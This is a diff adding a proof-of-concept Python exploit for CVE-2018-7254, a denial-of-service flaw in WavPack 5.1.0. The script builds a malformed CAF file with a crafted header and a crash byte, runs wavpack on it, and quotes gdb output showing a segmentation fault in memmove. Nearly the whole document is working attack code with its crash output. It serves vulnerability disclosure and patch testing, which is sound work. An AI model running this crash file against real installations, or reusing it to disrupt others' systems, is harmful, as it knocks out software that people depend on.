@@ -1,0 +1,44 @@
+# Exploit title: Wavpack 5.1.0 - Denial of Service
+# Date: 20.02.2018
+# Exploit Author: r4xis
+# https://github.com/r4xis
+#
+# Vendor Homepage:  http://www.wavpack.com/
+# Software Links:   http://www.wavpack.com/downloads.html
+#                   https://github.com/dbry/WavPack
+#
+#
+# Version: Wavpack 5.1.0
+# Tested on:    Debian 9.3.0 64 bit
+#               Windows 7 32 bit and 64 bit
+#               Windows 8 64 bit
+#
+#
+# CVE: CVE-2018-7254
+# CVE Details:
+# https://nvd.nist.gov/vuln/detail/CVE-2018-7254
+# https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889274
+# https://github.com/dbry/WavPack/issues/26
+
+
+import os
+
+head = "\x63\x61\x66\x66"
+version = "\x00\x01"
+junk1 = "\x00"*(0xa0-6)
+crash = "\x80"
+junk2 = "\x00"*100
+
+f=open("poc.caf", 'w')
+f.write(head+version+junk1+crash+junk2)
+f.close()
+
+os.system("wavpack poc.caf")
+
+'''
+Debian gdb output:
+Program received signal SIGSEGV, Segmentation fault.
+__memmove_sse2_unaligned_erms ()
+    at ../sysdeps/x86_64/multiarch/../multiarch/memmove-vec-unaligned-erms.S:333
+333	../sysdeps/x86_64/multiarch/../multiarch/memmove-vec-unaligned-erms.S: No such file or directory.
+'''
